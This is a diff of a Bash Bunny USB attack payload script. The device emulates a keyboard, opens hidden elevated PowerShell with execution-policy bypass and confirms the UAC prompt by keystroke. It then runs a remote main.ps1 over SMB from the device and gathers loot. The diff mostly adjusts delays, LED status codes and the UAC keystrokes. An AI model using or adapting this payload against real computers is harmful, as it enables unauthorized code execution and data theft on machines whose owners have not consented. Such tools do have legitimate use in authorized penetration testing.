@@ -8,13 +8,14 @@
 # Attackmodes:   HID, Ethernet
 # 
 # 
+# White................Wait for driver installation
 # Red Blink Fast.......Impacket not found
 # Red Blink Slow.......Target did not acquire IP address
 # Amber Blink Fast.....Initialization
 # Amber................HID Stage
 # Purple Blink Fast....Wait for IP coming up
 # Purple Blink Slow....Wait for Handshake (SMB Server Coming up)
-# Purple...............Powershell scripts running  
+# Purple / Amber ......Powershell scripts running  
 # RED..................Error in Powershell scripts
 # Green................Finished
 #
@@ -24,11 +25,10 @@
 source bunny_helpers.sh
 
 # Some Variables
-
-#CLEARTRACKS="yes" # yes or no
 SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
 LOOTDIR=$SWITCHDIR/loot
 mkdir -p $LOOTDIR >/dev/null
+
 
 # Initialization
 LED R G 100
@@ -40,32 +40,39 @@ if [ ! -d /pentest/impacket/ ]; then
   exit 1
 fi
 
+# remove old Handshake Files
 rm -f $SWITCHDIR/CON_*
 
 # HID STAGE
 # Runs minimized powershell waiting for Bash Bunny to appear as 172.16.64.1.
 # Once found, initiates file copy and exits
-LED R G
+LED R G B
 ATTACKMODE HID
 
 Q SET_LANGUAGE DE
 
-Q DELAY 5000
+# Give some time for driver installation
+Q DELAY 25000
 
+LED R G 100
 # Launch powershell as admin and deletes Run history
 Q GUI r
 Q DELAY 1000
 Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18' -Verb runAs"
+Q DELAY 500
 Q ENTER
 
-# Bypass UAC Chenge "ALT j" according to your language i.e. for us it is ALT o
+# Bypass UAC :: Change "ALT j" according to your language i.e. for us it is ALT o
 Q DELAY 1000
 Q ALT j
-Q DELAY 750
+Q DELAY 500
+Q ENTER
 
+LED R G
 # Wait for Bunny Ethernet and Start main.ps1 Powershell Script
 Q DELAY 500
 Q STRING "powershell \"while (1) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\172.16.64.1\e\main.ps1; exit } }\""
+Q DELAY 500
 Q ENTER
 Q DELAY 2000 
 Q exit
@@ -103,12 +110,11 @@ done
 mv $SWITCHDIR/CON_REQ $SWITCHDIR/CON_OK
 LED R B
 
-
-
-
 # Wait until CON_EOF - Computer set it if all is ready
 while ! [ -f $SWITCHDIR/CON_EOF ]; do
+	LED R B
 	sleep 1
+	LED R G
 	if [ -f $SWITCHDIR/CON_ERR ]; then
 		rm $SWITCHDIR/CON_ERR
 		LED R
